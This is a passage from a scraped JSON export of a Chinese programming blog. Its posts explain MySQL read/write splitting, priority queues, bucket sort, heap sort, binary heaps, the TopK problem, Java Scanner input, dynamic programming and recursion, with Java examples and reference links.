MySQL的主从复制和MySQL的读写分离两者有着紧密联系，首先部署主从复制，只有主从复制完了，才能在此基础上进行数据的读写分离。简单来说，读写分离就是只在主服务器上写，只在从服务器上读，基本的原理是让主数据库处理事务性查询，而从数据库处理select查询。当业务量非常大时，一台服务器的性能无法满足需求，就可以通过配置主从复制实现写分离来分摊负载，避免因负载太高而造成无法及时响应请求。 读写分离的方式，扩展了数据库对读数据的处理能力，但写能力并没有任何提升。 而且，数据库中单表的数据量是有限制的，当数据库中单表的数据量到达一定程度后，数据库的性能会显著下降。 使用原因大部分互联网业务读多写少，数据库的读往往最先成为性能瓶颈，如果希望： 线性提升数据库读性能 通过消除读写锁冲突提升数据库写性能 此时可以使用分组架构。 一句话，分组主要解决“数据库读性能瓶颈”问题，在数据库扛不住读的时候，通常读写分离，通过增加从库线性提升系统读性能。 适用场景读写分离适用与读远大于写的场景，如果只有一台服务器，当select很多时，update和delete会被这些select阻塞，因此并发性能不高。 对于写和读比例相近的应用，应该部署双主相互复制。 Reference 数据库读写分离架构，为什么我不喜欢 - http://www.10tiao.com/html/249/201801/2651960806/1.html MySQL读写分离最佳实践 - https://www.jianshu.com/p/1ac435a6510e 分库分表的几种常见形式以及可能遇到的难 - https://www.infoq.cn/article/key-steps-and-likely-problems-of-split-table 大众点评订单系统分库分表实践 - https://tech.meituan.com/2016/11/18/dianping-order-db-sharding.html MySQL 分库分表方案，总结的非常好！ - https://juejin.im/entry/5b5eb7f2e51d4519700f7d3c 表的垂直拆分和水平拆分 - https://www.kancloud.cn/thinkphp/mysql-design-optimalize/39326 基于MySQL数据库下亿级数据的分库分表 - https://zhuanlan.zhihu.com/p/54594681?utm_source=wechat_session&amp;utm_medium=social&amp;utm_oi=559493336751333376&amp;from=singlemessage&amp;isappinstalled=0","comments":true,"categories":[{"name":"Database","slug":"Database","permalink":"http://swsmile.info/categories/Database/"}],"tags":[{"name":"Database","slug":"Database","permalink":"http://swsmile.info/tags/Database/"}]},{"title":"【Data Structure】优先队列（Priority Queue）","date":"2019-07-31T04:45:15.000Z","path":"2019/07/31/【Data-Structure】优先队列/","text":"Background队列（Queue）队列的特点是什么？ 聪明的小伙伴们都知道，是先进先出（FIFO）。 入队列： 出队列： 优先队列（Priority Queue）因为队列中允许的操作是先进先出（FIFO），在队尾插入元素，在队头取出元素。 而堆优先队列，不再遵循先入先出的原则，而是分为两种情况： 最大优先队列，无论入队顺序，当前最大的元素优先出队。 最小优先队列，无论入队顺序，当前最小的元素优先出队。 比如有一个最大优先队列，它的最大元素是8，那么虽然元素8并不是队首元素，但出队的时候仍然让元素8首先出队： 要满足以上需求，利用线性数据结构（比如，无序数组、有序数组或者链表）并非不能实现，只是时间复杂度较高（最坏时间复杂度O(n)），因而不是最理想的方式。 优先队列的实现方式优先队列有以下实现方式： 无序数组 有序数组 链表 堆（二叉堆） 二叉搜索树 注意，堆是实现优先队列（Priority Queue）较为高效的方式，因此，在不严谨的情况下，我们有时也将堆和优先队列相互等同。 基于无序数组的优先队列实现无序数组实现方式的入队操作，直接把入队元素加到数组尾部。出队需要遍历数组，找出优先级别最高的出队，空缺的位置由后面元素依次补上。因此，入队的时间复杂度为O(1)，出队为O(N)。 基于有序数组的优先队列实现由于要求数组有序，因此在插入的时候需要保存有序，插入操作需要找到适合的位置，然后在该位置插入，位置后面的元素依次往后移动，时间复杂度为O(n)。而出队，由于序列是有序，可以在O(1)内出队。 基于链表的优先队列实现链表的实现和有序数组的实现原理上相似，不同的是队列元素采用链式存储结构。可以使用有序链表和无序链表。 基于堆（二叉堆）的优先队列实现基于完全二叉树（complete binary tree），是实现堆的一个经典方式，称为二叉堆（binary heap），而又由于其它几种堆（二项式堆，斐波纳契堆等）用的较少，因此一般说堆，就是指二叉堆（binary heap）。 最小优先队列中的入队操作![PriorityQueue_offer.png](assets/939998-20160512205600890-346195840 copy.png) 假设现有元素 4 需要插入，为了维持完全二叉树的特性，新插入的元素一定是放在整棵树的最右下方（在本例子新插入元素位于结点 9 的右子树中）；同时为了满足任一结点的值要小于左右子树的值这一特性，新插入的元素要和其父结点作比较，如果比父结点小，则进行交换操作（新插入元素顶替父节点的位置，自然地，父节点则需要下移），不断向上寻找，找到比自己大的父结点就进行交换操作，直到没有符合条件的值为止。 最小优先队列的出队操作![PriorityQueue_poll.png](assets/939998-20160512205634609-402016454 copy.png) 核心点：将最后一个元素填充到堆顶，然后不断的下沉这个元素。 时间复杂度分析由于二叉堆有 $log_2n$ 层深，因此二叉堆节点入队（上浮）和出队（下沉）操作的时间复杂度都是$O(log_2n)$，所以优先队列的入队和出队操作的平均时间和最差时间都是 $O(log_2n)$。 Reference 数据结构与算法之「堆」- https://cxyxiaowu.com/articles/2019/04/04/1554345169921.html 常见排序算法 - 堆排序 (Heap Sort) - http://bubkoo.com/2014/01/14/sort-algorithm/heap-sort/ 优先队列原理与实现 - https://www.cnblogs.com/luoxn28/p/5616101.html 漫画：什么是优先队列？ - https://www.itcodemonkey.com/article/9681.html 优先队列的五种实现 - https://allenwind.github.io/2017/09/12/%E4%BC%98%E5%85%88%E9%98%9F%E5%88%97%E7%9A%84%E4%BA%94%E7%A7%8D%E5%AE%9E%E7%8E%B0/","comments":true,"categories":[{"name":"Data Structure","slug":"Data-Structure","permalink":"http://swsmile.info/categories/Data-Structure/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"http://swsmile.info/tags/Data-Structure/"}]},{"title":"【Algorithm】排序算法 - 桶排序（Bucket Sort）","date":"2019-07-30T14:17:34.000Z","path":"2019/07/30/【Algorithm】排序算法-桶排序/","text":"思路 设置固定空桶数 将数据放到对应的空桶中 将每个不为空的桶进行排序 拼接不为空的桶中的数据，得到结果 步骤演示假设一组数据（长度为20）为 1[63,157,189,51,101,47,141,121,157,156,194,117,98,139,67,133,181,13,28,109] 现在需要按5个分桶，进行桶排序，实现步骤如下: 找到数组中的最大值194和最小值13，然后根据桶数为5，计算出每个桶中的数据范围为(194-13+1)/5=36.4； 遍历原始数据，以第一个数据63为例，先找到该数据对应的桶序列（Math.floor(63 - 13) / 36.4) =1），然后将该数据放入序列为1的桶中（从0开始算）； 当向同一个桶中第二次插入数据时，判断桶中已存在的数字与新插入的数字的大小，按从左到右，从小打大的顺序插入。如第一个桶已经有了63，再插入51，67后，桶中的排序为(51,63,67) ，一般通过链表来存放桶中数据。 全部数据装桶完毕后，按序列，从小到大合并所有非空的桶（0，1，2，3，4桶） 合并完之后就是排序好的数据了 步骤图示： 动画： 实现123456789101112131415161718192021222324252627282930313233343536373839public static void main(String[] args) &#123; int[] intArr = &#123;47, 85, 10, 45, 16, 34, 67, 80, 34, 4, 0, 99&#125;; //int[] intArr = &#123;21,11,33,70,5,25,65,55&#125;; System.out.println(\"Original array- \" + Arrays.toString(intArr)); bucketSort(intArr, 10); System.out.println(\"Sorted array after bucket sort- \" + Arrays.toString(intArr));&#125;private static void bucketSort(int[] intArr, int noOfBuckets)&#123; // Create bucket array List&lt;Integer&gt;[] buckets = new List[noOfBuckets]; // Associate a list with each index // in the bucket array for(int i = 0; i &lt; noOfBuckets; i++)&#123; buckets[i] = new LinkedList&lt;&gt;(); &#125; // Assign numbers from array to the proper bucket // by using hashing function for(int num : intArr)&#123; //System.out.println(\"hash- \" + hash(num)); buckets[hash(num)].add(num); &#125; // sort buckets for(List&lt;Integer&gt; bucket : buckets)&#123; Collections.sort(bucket); &#125; int i = 0; // Merge buckets to get sorted array for(List&lt;Integer&gt; bucket : buckets)&#123; for(int num : bucket)&#123; intArr[i++] = num; &#125; &#125;&#125;// A very simple hash functionprivate static int hash(int num)&#123; return num/10;&#125; 时间复杂度桶排序最好情况下使用线性时间O(n)。事实上，桶排序算法的总时间复杂度，取决与对各个桶之间数据进行排序的时间复杂度，因为其它部分的时间复杂度都为O(n)。 很显然，桶划分的越多，各个桶中的数据越少，排序所用的时间也会越少。但相应的空间消耗就会增大。在额外空间充足的情况下，尽量增大桶的数量，极限情况下每个桶只有一个数据时，或者是每只桶只装一个值时，完全避开了桶内排序的操作，桶排序的最好时间复杂度就能够达到 O(n)。 比如高考总分 750 分，全国几百万人，我们只需要创建 751 个桶，循环一遍挨个扔进去，排序速度是毫秒级。 但是如果数据经过桶的划分之后，桶与桶的数据分布极不均匀，有些数据非常多，有些数据非常少，比如 [8，2，9，10，1，23，53，22，12，9000] 这十个数据，我们分成十个桶装，结果发现第一个桶装了 9 个数据，这是非常影响效率的情况，会使时间复杂度下降到 $O(nlog_2n)$，解决办法是我们每次桶内排序时判断一下数据量，如果桶里的数据量过大，那么应该在桶里面回调自身再进行一次桶排序。 空间复杂度稳定性稳定性是指，比如a在b前面，a=b，排序后，a仍然应该在b前面，这样就算稳定的。 桶排序中，假如升序排列，a已经在桶中，b插进来是永远都会a右边的（因为一般是从右到左，如果不小于当前元素，则插入改元素的右侧），所以桶排序是稳定的。 当然了，如果采用元素插入后再分别进行桶内排序，并且桶内排序算法采用快速排序，那么就不是稳定的。 适用范围用排序主要适用于均匀分布的数字数组，在这种情况下能够达到最大效率。 Reference 排序算法之桶排序的深入理解以及性能分析 - https://dailc.github.io/2016/12/03/baseKnowlenge_algorithm_sort_bucketSort.html https://www.geeksforgeeks.org/bucket-sort-2/ Bucket Sort Program in Java - https://netjs.blogspot.com/2019/01/bucket-sort-program-in-java.html 这或许是东半球讲十大排序算法最好的一篇文章 - https://cxyxiaowu.com/articles/2019/06/11/1560233679033.html","comments":true,"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/categories/Algorithm/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/tags/Algorithm/"}]},{"title":"【Algorithm】TopK 问题","date":"2019-07-30T13:36:17.000Z","path":"2019/07/30/【Algorithm】TopK-问题/","text":"有1亿个浮点数，如果找出期中最大的10000个？排序最容易想到的方法是将数据全部排序，然后在排序后的集合中进行查找，最快的排序算法的时间复杂度一般为O（nlogn），如快速排序。 但是在32位的机器上，每个float类型占4个字节，1亿个浮点数就要占用400MB的存储空间，对于一些可用内存小于400M的计算机而言，很显然是不能一次将全部数据读入内存进行排序的。其实即使内存能够满足要求（我机器内存都是8GB），该方法也并不高效，因为题目的目的是寻找出最大的10000个数即可，而排序却是将所有的元素都排序了，做了很多的无用功。 局部淘汰法第二种方法为局部淘汰法，该方法与排序方法类似，用一个容器保存前10000个数，然后将剩余的所有数字——与容器内的最小数字相比，如果所有后续的元素都比容器内的10000个数还小，那么容器内这个10000个数就是最大10000个数。 如果某一后续元素比容器内最小数字大，则删掉容器内最小元素，并将该元素插入容器，最后遍历完这1亿个数，得到的结果容器中保存的数即为最终结果了。此时的时间复杂度为$O（n+m^2）$，其中m为容器的大小，即10000。 分治法第三种方法是分治法，将1亿个数据分成100份，每份100万个数据，找到每份数据中最大的10000个，最后在剩下的100*10000个数据里面找出最大的10000个。 如果100万数据选择足够理想，那么可以过滤掉1亿数据里面99%的数据。100万个数据里面查找最大的10000个数据的方法如下：用快速排序的方法，将数据分为2堆，如果大的那堆个数N大于10000个，继续对大堆快速排序一次分成2堆，如果大的那堆个数N大于10000个，继续对大堆快速排序一次分成2堆，如果大堆个数N小于10000个，就在小的那堆里面快速排序一次，找第10000-n大的数字；递归以上过程，就可以找到第1w大的数。参考上面的找出第1w大数字，就可以类似的方法找到前10000大数字了。此种方法需要每次的内存空间为10^6*4=4MB，一共需要101次这样的比较。 Hash法第四种方法是Hash法。如果这1亿个书里面有很多重复的数，先通过Hash法，把这1亿个数字去重复，这样如果重复率很高的话，会减少很大的内存用量，从而缩小运算空间，然后通过分治法或最小堆法查找最大的10000个数。 最小堆第五种方法采用最小堆。首先读入前10000个数来创建大小为10000的最小堆，建堆的时间复杂度为O（mlogm）（m为数组的大小即为10000），然后遍历后续的数字，并于堆顶（最小）数字进行比较。如果比最小的数小，则继续读取后续数字；如果比堆顶数字大，则替换堆顶元素并重新调整堆为最小堆。整个过程直至1亿个数全部遍历完为止。然后按照中序遍历的方式输出当前堆中的所有10000个数字。该算法的时间复杂度为O（nmlogm），空间复杂度是10000（常数）。 ​ Reference 10亿个数中找出最大的10000个数（top K问题） - https://my.oschina.net/u/2822116/blog/795455","comments":true,"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/categories/Algorithm/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/tags/Algorithm/"}]},{"title":"【Java】I/O - 读取数据","date":"2019-07-30T08:07:36.000Z","path":"2019/07/30/【Java】IO-读取数据/","text":"Java Scanner 类java.util.Scanner 是 Java5 的新特征，我们可以通过 Scanner 类来获取用户的输入。 下面是创建 Scanner 对象的基本语法： 1Scanner s = new Scanner(System.in); 接下来我们演示一个最简单的数据输入，并通过 Scanner 类的 next() 与 nextLine() 方法获取输入的字符串，在读取前我们一般需要 使用 hasNext 与 hasNextLine 判断是否还有输入的数据。 next 方法123456789101112131415public class ScannerDemo &#123; public static void main(String[] args) &#123; Scanner scan = new Scanner(System.in); // 从键盘接收数据 // next方式接收字符串 System.out.println(\"next方式接收：\"); // 判断是否还有输入 if (scan.hasNext()) &#123; String str1 = scan.next(); System.out.println(\"输入的数据为：\" + str1); &#125; scan.close(); &#125;&#125; 执行以上程序输出结果为： 12345$ javac ScannerDemo.java$ java ScannerDemonext方式接收：aaa com输入的数据为：aaa 可以看到 com 字符串并未输出。 nextLine 方法123456789101112131415public class ScannerDemo &#123; public static void main(String[] args) &#123; Scanner scan = new Scanner(System.in); // 从键盘接收数据 // nextLine方式接收字符串 System.out.println(\"nextLine方式接收：\"); // 判断是否还有输入 if (scan.hasNextLine()) &#123; String str2 = scan.nextLine(); System.out.println(\"输入的数据为：\" + str2); &#125; scan.close(); &#125;&#125; 执行以上程序输出结果为： 12345$ javac ScannerDemo.java$ java ScannerDemonextLine方式接收：bbb com输入的数据为：bbb com 可以看到 com 字符串输出。 next() 与 nextLine() 区别next(): 一定要读取到有效字符后才可以结束输入。 对输入有效字符之前遇到的空白，next() 方法会自动将其去掉。 只有输入有效字符后才将其后面输入的空白作为分隔符或者结束符。 next() 不能得到带有空格的字符串。 nextLine()： 以Enter为结束符,也就是说 nextLine()方法返回的是输入回车之前的所有字符。 可以获得空白。 读取 int 或 float 类型的数据 如果要输入 int 或 float 类型的数据，在 Scanner 类中也有支持，但是在输入之前最好先使用 hasNextXxx() 方法进行验证，再使用 nextXxx() 来读取： 1234567891011121314151617181920212223242526272829public class ScannerDemo &#123; public static void main(String[] args) &#123; Scanner scan = new Scanner(System.in); // 从键盘接收数据 int i = 0; float f = 0.0f; System.out.print(\"输入整数：\"); if (scan.hasNextInt()) &#123; // 判断输入的是否是整数 i = scan.nextInt(); // 接收整数 System.out.println(\"整数数据：\" + i); &#125; else &#123; // 输入错误的信息 System.out.println(\"输入的不是整数！\"); &#125; System.out.print(\"输入小数：\"); if (scan.hasNextFloat()) &#123; // 判断输入的是否是小数 f = scan.nextFloat(); // 接收小数 System.out.println(\"小数数据：\" + f); &#125; else &#123; // 输入错误的信息 System.out.println(\"输入的不是小数！\"); &#125; scan.close(); &#125;&#125; 执行以上程序输出结果为： 123456$ javac ScannerDemo.java$ java ScannerDemo输入整数：12整数数据：12输入小数：1.2小数数据：1.2 Reference Java Scanner 类 - https://www.runoob.com/java/java-scanner-class.html","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Algorithm】排序算法 - 堆排序（Heap Sort）","date":"2019-07-30T02:30:27.000Z","path":"2019/07/30/【Algorithm】排序算法-堆排序/","text":"堆排序（Heap Sort）堆排序是利用二叉堆（Binary Heap）这种数据结构而设计的一种排序算法，堆排序是一种选择排序，它的最坏，最好，平均时间复杂度均为$O(nlog_2n)$，它是一种不稳定排序。首先简单了解下堆结构。 堆是具有以下性质的完全二叉树： 每个结点的值都大于或等于其左右孩子结点的值，称为大顶堆； 或者每个结点的值都小于或等于其左右孩子结点的值，称为小顶堆。如下图： 同时，我们对堆中的结点按层进行编号，将这种逻辑结构映射到数组中就是下面这个样子 该数组从逻辑上讲就是一个堆结构，我们用简单的公式来描述一下堆的定义就是： 大顶堆：arr[i] &gt;= arr[2i+1] &amp;&amp; arr[i] &gt;= arr[2i+2] 小顶堆：arr[i] &lt;= arr[2i+1] &amp;&amp; arr[i] &lt;= arr[2i+2] 堆的存储一般都用数组来表示堆，i结点的父结点下标就为(i – 1) / 2。它的左右子结点下标分别为2 * i + 1和2 * i + 2。如第0个结点左右子结点下标分别为1和2。 堆排序原理 以大顶堆为例，在将无序序列调整成一个大顶堆后，把大顶堆的堆顶元素取出，将取出后剩余的元素继续调整为大顶堆，之后再次将堆顶元素取出，不断重复上面的过程，直到大顶堆中只剩下一个元素后结束。 堆排序步骤步骤一 - 构建大顶堆步骤一 将给定无序序列构造成一个大顶堆（一般升序采用大顶堆，降序采用小顶堆)。 1 假设给定无序序列结构如下 2 此时我们从最后一个非叶子结点开始（即最后一个节点的父节点，该节点索引为 arr.length/2-1=5/2-1=1，也就是结点 6），然后依次从右往左，从下至上进行调整。 3 找到第二个非叶子节点4（(arr.length-1)/2-1），由于[4,9,8]中9元素最大，4和9交换。 这时，交换导致了子根[4,5,6]结构混乱，继续调整，[4,5,6]中6最大，交换4和6。 此时，我们就将一个无需序列构造成了一个大顶堆。 步骤二 - 元素交换，此后不断构建大顶堆步骤二：将堆顶元素与末尾元素进行交换，使末尾元素最大。然后继续调整当前堆成大顶堆，调整完成后，再将堆顶元素与末尾元素交换，这样得到第二大元素。如此反复进行交换、重建、交换。 1 将堆顶元素9和末尾元素4进行交换 2 重新调整结构，使其继续满足堆定义 3 再将堆顶元素8（计算索引：(arr.length-1)/2-1=0）与末尾元素5进行交换，得到第二大元素8. 后续过程，继续进行调整，交换，如此反复进行，最终使得整个序列有序 再简单总结下堆排序的基本思路： 将无需序列构建成一个堆，根据升序降序需求选择大顶堆或小顶堆（假设选择大顶堆）; 构建大顶堆完成后，将堆顶元素与末尾元素交换，将最大元素”沉”到数组末端； 重新调整结构，使其满足大顶堆的定义，然后继续交换堆顶元素与当前末尾元素，反复执行调整+交换步骤，直到整个序列有序（此时排序后，最小元素在序列的头部）。 Implementation12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// Java program for implementation of Heap Sort public class HeapSort &#123; public static void sort(int arr[]) &#123; int n = arr.length; // Build heap (rearrange array) for (int i = n / 2 - 1; i &gt;= 0; i--) heapify(arr, n, i); // One by one extract an element from heap for (int i=n-1; i&gt;=0; i--) &#123; // Move current root to end int temp = arr[0]; arr[0] = arr[i]; arr[i] = temp; // call max heapify on the reduced heap heapify(arr, i, 0); &#125; &#125; // To heapify a subtree rooted with node i which is // an index in arr[]. n is size of heap static void heapify(int arr[], int n, int i) &#123; int largest = i; // Initialize largest as root int l = 2*i + 1; // left = 2*i + 1 int r = 2*i + 2; // right = 2*i + 2 // If left child is larger than root if (l &lt; n &amp;&amp; arr[l] &gt; arr[largest]) largest = l; // If right child is larger than largest so far if (r &lt; n &amp;&amp; arr[r] &gt; arr[largest]) largest = r; // If largest is not root if (largest != i) &#123; int swap = arr[i]; arr[i] = arr[largest]; arr[largest] = swap; // Recursively heapify the affected sub-tree heapify(arr, n, largest); &#125; &#125; &#125; Reference 常见排序算法 - 堆排序 (Heap Sort) - http://bubkoo.com/2014/01/14/sort-algorithm/heap-sort/ HeapSort - https://www.geeksforgeeks.org/heap-sort/ 算法从入门到“放弃”（10）- 堆排序 - https://zhuanlan.zhihu.com/p/45725214 【图解数据结构】一组动画彻底理解堆排序 - https://mp.weixin.qq.com/s?__biz=MzUyNjQxNjYyMg==&amp;mid=2247484004&amp;idx=1&amp;sn=ecbafdec3c38ac7a13979aace18569e4&amp;chksm=fa0e6de5cd79e4f3b059d507ac0c6bf9ec916711891f0e92377f0d4bcf9d24319d09ed68d990&amp;scene=21#wechat_redirect 这或许是东半球讲十大排序算法最好的一篇文章 - https://cxyxiaowu.com/articles/2019/06/11/1560233679033.html","comments":true,"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/categories/Algorithm/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/tags/Algorithm/"}]},{"title":"【Data Structure】堆（Heap）/ 二叉堆（binary heap）","date":"2019-07-29T14:39:20.000Z","path":"2019/07/29/【Data-Structure】堆/","text":"Background这里来说明一下满二叉树的概念与完全二叉树的概念。 满二叉树（Full Binary Tree）满二叉树：除了叶子节点，所有的节点的左右孩子都不为空，就是一棵满二叉树，如下图。 可以看出：满二叉树所有的节点都拥有左孩子，又拥有右孩子。 完全二叉树（Complete Binary Tree）完全二叉树：不一定是一个满二叉树，但它不满的那部分一定在右下侧，如下图： 堆（Heap）/ 二叉堆（binary heap）基于完全二叉树（complete binary tree），是实现堆的一个经典方式，称为二叉堆（binary heap），而又由于其它几种堆（二项式堆，斐波纳契堆等）用的较少，因此一般说堆，就是指二叉堆（binary heap）。 而堆又是实现优先队列（Priority Queue）较为高效的方式（这意味着优先队列还有其他实现方式），因此，在不严谨的情况下，我们有时也将堆和优先队列相互等同。 堆的特性堆的特性： 必须是完全二叉树 任一结点的值是其子树中所有结点的最大值或最小值 当为最大值时，称为“最大堆”，也称大顶堆； 当为最小值时，称为“最小堆”，也称小顶堆。 最大堆（Max Heap） 最大堆中的最大元素值出现在根结点（堆顶） 堆中每个父节点的元素值都大于等于其孩子结点（如果存在） 最小堆（Min Heap） 最小堆中的最小元素值出现在根结点（堆顶） 堆中每个父节点的元素值都小于等于其孩子结点（如果存在） 三个重要的性质 数组里的第一个元素array[0]拥有最高的优先级别。 给定一个下标 i，那么对于元素 array[i] 而言: 它的父节点所对应的元素下标是 (i-1) / 2 它的左孩子所对应的元素下标是 2*i + 1 它的右孩子所对应的元素下标是 2*i + 2 数组里每个元素的优先级别都要高于它两个孩子的优先级别。 堆的操作最小堆中的插入（ADD）操作 当有新的数据加入到优先队列中，新的数据首先被放置在二叉堆的底部，然后不断地对它进行向上筛选的操作，即如果发现它的优先级别比父节点的优先级别还要高，那么就和父节点的元素相互交换，再接着网上进行比较，直到无法再继续交换为止。由于二叉堆是一棵完全二叉树，并假设堆的大小为k，因此整个过程其实就是沿着树的高度网上爬，所以只需要O(logk)的时间。 最小堆中的删除（DELETE）操作 核心点：将最后一个元素填充到堆顶，然后不断的下沉这个元素。 当堆顶的元素被取出时，我们要更新堆顶的元素来作为下一次按照优先级顺序被取出的对象，我们所需要的是将堆底部的元素放置到堆顶，然后不断地对它执行向下筛选的操作，在这个过程中，该元素和它的两个孩子节点对比，看看哪个优先级最高，如果优先级最高的是其中一个孩子，就将该元素和那个孩子进行交换，然后反复进行下去，直到无法继续交换为止，整个过程就是沿着树的高度往下爬，所以时间复杂度也是O(logk)。 Reference 数据结构与算法之「堆」- https://cxyxiaowu.com/articles/2019/04/04/1554345169921.html 常见排序算法 - 堆排序 (Heap Sort) - http://bubkoo.com/2014/01/14/sort-algorithm/heap-sort/ 优先队列原理与实现 - https://www.cnblogs.com/luoxn28/p/5616101.html 优先队列的五种实现 - https://allenwind.github.io/2017/09/12/%E4%BC%98%E5%85%88%E9%98%9F%E5%88%97%E7%9A%84%E4%BA%94%E7%A7%8D%E5%AE%9E%E7%8E%B0/","comments":true,"categories":[{"name":"DataStructure","slug":"DataStructure","permalink":"http://swsmile.info/categories/DataStructure/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"http://swsmile.info/tags/Data-Structure/"}]},{"title":"【Algorithm】算法思想 - 动态规划（Dynamic Programming）","date":"2019-07-29T12:59:33.000Z","path":"2019/07/29/【Algorithm】算法思想-动态规划/","text":"Background介绍动态规划之前先介绍一下分治策略（Divide and Conquer）。 分治策略将原问题分解为若干个规模较小但类似于原问题的子问题（Divide），「递归」的求解这些子问题（Conquer），然后再合并这些子问题的解来建立原问题的解。 因为在求解大问题时，需要递归的求小问题，因此一般用「递归」的方法实现，即自顶向下。 动态规划（Dynamic Programming）动态规划其实和分治策略是类似的，也是将一个原问题分解为若干个规模较小的子问题，递归的求解这些子问题，然后合并子问题的解得到原问题的解。区别在于这些子问题会有重叠，一个子问题在求解后，可能会再次求解，于是我们想到将这些子问题的解存储起来，当下次再次求解这个子问题时，直接拿过来就是。其实就是说，动态规划所解决的问题是分治策略所解决问题的一个子集，只是这个子集更适合用动态规划来解决从而得到更小的运行时间。 ** ** 即用动态规划能解决的问题分治策略肯定能解决，只是运行时间长了。因此，分治策略一般用来解决子问题相互对立的问题，称为标准分治，而动态规划用来解决子问题重叠的问题。 将「动态规划」的概念关键点抽离出来描述就是这样的： 1.动态规划法试图只解决每个子问题一次 2.一旦某个给定子问题的解已经算出，则将其记忆化存储，以便下次需要同一个子问题解之时直接查表。 从递归到动态规划还是以 爬台阶 为例，如果以递归的方式解决的话，那么这种方法的时间复杂度为$O(2^n)$。 背包问题资源分配型的背包问题是很经典的一类动态规划问题： A.我们一个背包装载重量是10，有三个物品，重量分别为5、4、7，价值分别为6、4、9，按照我们的策略先拿价值高的物品，拿了第三个物品后，我们的背包就无法在放入其他物品了。但是我们可以发现如果我们拿第一个和第二个物品，我们可以获得更大的价值。同理也可以举出先拿价值小的策略的反例。 B.我们一个背包装载重量是10，有三个物品，重量分别为9、4、3，价值分别为1、5、10，按照我们的策略先拿重量高的物品，拿了第一个物品后，我们的背包就无法在放入其他物品了。但是我们可以发现如果我们拿第二个和第三个物品，我们可以获得更大的价值。同理也可以举出先拿重量小的策略的反例。 有同学就会有疑问了，我们为什么不按照性价比来拿呢，那么我们来看一下C选项，如果我们一个背包装载重量是10，有三个物品，重量分别为9、4、6，价值分别为20、8、13，我们按照性价比排序，性价比最高的是第一个物品，我们按照策略先拿第一个物品，然后背包不能放入其他物品，其实我们可以发现二三两个物品的价值是超过第一个物品的，我们可以获得更大的价值。同理也可以举出先拿价值小的策略的反例。 这样一个问题，贪心求的只是局部最优解，这一题中无法得到全局最优解，所以我们需要用到动态规划。 动态规划题目特点 计数 有多少种方式走到右下角 有多少种方法选出k个数使得和是Sum 求最大最小值 从左上角走到右下角路径的最大数字和 最长上升子序列长度 求存在性 取石子游戏，先手是否必胜 能不能选出k个数使得和是Sum 动态规划组成部分确定状态 状态在动态规划中的作用属于定海神针 简单的说，解动态规划的时候需要开一个数组，数组的每个元素f[i]或者 f[i][j]代表什么 – 类似于解数学题中，X，Y，Z代表什么 确定状态需要两个意识： 最后一步（最优策略中使用的最后一枚硬币aK） 子问题（最少的硬币拼出更小的面值27-aK） 转移方程 设状态f[X]=最少用多少枚硬币拼出X。 对于任意X， 初始条件和边界情况 f[X] = min{f[X-2]+1, f[X-5]+1, f[X-7]+1} 两个问题：X-2, X-5 或者X-7小于0怎么办？什么时候停下来？ 如果不能拼出Y，就定义f[Y]=正无穷 例如f[-1]=f[-2]=…=正无穷 所以f[1] =min{f[-1]+1, f[-4]+1,f[-6]+1}=正无穷, 表示拼不出来1 初始条件：f[0] = 0 计算顺序 拼出X所需要的最少硬币数：f[X] = min{f[X-2]+1, f[X-5]+1, f[X-7]+1} 初始条件：f[0] = 0 • 然后计算f[1], f[2], …, f[27] 当我们计算到f[X]时，f[X-2], f[X-5], f[X-7]都已经得到结果了 动态规划题目类型计数 - 坐标型动态规划 最简单的动态规划类型 给定一个序列或网格 需要找到序列中某个/些子序列或网格中的某条路径 某种性质最大/最小 计数（有多少种方式走到右下角，有多少种方法选出k个数使得和是Sum） 存在性 动态规划方程f[i]中的下标i表示以a i 为结尾的满足条件的子序列的性质，f[i][j] 中的下标i, j表示以格子(i, j)为结尾的满足条件的路径的性 最大值/最小值 个数 是否存在 坐标型动态规划的初始条件f[0]就是指以a0 为结尾的子序列的性质 例题 Leetcode - 62 Unique Paths Leetcode - 63 Unique Paths II Lintcode - 110 Minimum Path Sum 求最大最小值 - 序列型动态规划 从左上角走到右下角路径的最大数字和 最长上升子序列长度 例题 Leetcode - 322 Coin Change LintCode - 515 Paint House 求存在性 - 划分性动态规划 取石子游戏，先手是否必胜 能不能选出k个数使得和是Sum 例题 Leetcode - 55 Jump Game Lintcode - 512 Decode Ways Reference 看动画轻松理解「递归」与「动态规划」 - https://cxyxiaowu.com/articles/2019/04/04/1554345266086.html","comments":true,"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/categories/Algorithm/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/tags/Algorithm/"}]},{"title":"【Algorithm】递归（Recursion）","date":"2019-07-29T04:53:04.000Z","path":"2019/07/29/【Algorithm】递归/","text":"递归（Recursion）先下定义：递归算法是一种直接或者间接调用自身函数或者方法的算法。 通俗来说，递归算法的实质是把问题分解成规模缩小的同类问题的子问题，然后递归调用方法来表示问题的解。它有如下特点： 一个问题的解可以分解为几个子问题的解 这个问题与分解之后的子问题，除了数据规模不同，求解思路完全一样 存在递归终止条件，即必须有一个明确的递归结束条件，称之为递归出口 理解 通过动画一个一个特点来进行分析。 1 一个问题的解可以分解为几个子问题的解子问题就是相对与其前面的问题数据规模更小的问题。 在动图中①号问题（一块大区域）划分为②号问题，②号问题由两个子问题（两块中区域）组成。 2 这个问题与分解之后的子问题，除了数据规模不同，求解思路完全一样「①号划分为②号」与「②号划分为③号」的逻辑是一致的，求解思路是一样的。 3 存在递归终止条件，即存在递归出口把问题分解为子问题，把子问题再分解为子子问题，一层一层分解下去，不能存在无限循环，这就需要有终止条件。 ①号划分为②号，②号划分为③号，③号划分为④号，划分到④号的时候每个区域只有一个不能划分的问题，这就表明存在递归终止条件。 经典递归示例1 数组求和 1Sum(arr[0...n-1]) = 